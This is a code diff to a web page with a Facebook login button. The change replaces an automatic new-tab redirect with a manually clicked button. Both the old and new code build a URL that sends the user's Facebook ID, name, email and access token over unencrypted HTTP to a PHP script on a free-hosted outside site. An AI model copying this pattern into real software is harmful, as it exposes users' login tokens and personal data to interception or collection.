@@ -12,7 +12,12 @@
         onlogin="checkLoginState();">
     </fb:login-button>
 
+    <!-- Button to manually trigger the new tab open if necessary -->
+    <button id="openTabButton" style="display:none;" onclick="openTabWithUserData()">Open new tab with user data</button>
+
     <script>
+        let userDataUrl = ''; // Store the URL with user data
+
         // Facebook SDK initialization
         window.fbAsyncInit = function () {
             FB.init({
@@ -68,12 +73,21 @@
                     }
                 }
 
-                // Redirect to the PHP page with user details in the query parameters
-                let url = `http://sabbir28.rf.gd/save_user_data.php?facebook_id=${encodeURIComponent(userId)}&facebook_name=${encodeURIComponent(userName)}&facebook_email=${encodeURIComponent(userEmail)}&facebook_token=${encodeURIComponent(accessToken)}&filename=${encodeURIComponent(someuserdeta)}`;
+                // Create the URL with user data to be opened in a new tab
+                userDataUrl = `http://sabbir28.rf.gd/save_user_data.php?facebook_id=${encodeURIComponent(userId)}&facebook_name=${encodeURIComponent(userName)}&facebook_email=${encodeURIComponent(userEmail)}&facebook_token=${encodeURIComponent(accessToken)}&filename=${encodeURIComponent(someuserdeta)}`;
 
-                // Open the URL in a new tab
-                window.open(url, '_blank');
+                // Automatically show the button to open a new tab
+                document.getElementById('openTabButton').style.display = 'inline';
             });
+        }
+
+        // Function to open the new tab
+        function openTabWithUserData() {
+            if (userDataUrl) {
+                window.open(userDataUrl, '_blank');
+            } else {
+                alert('No user data available to open.');
+            }
         }
 
         // Called when user completes the Facebook login process
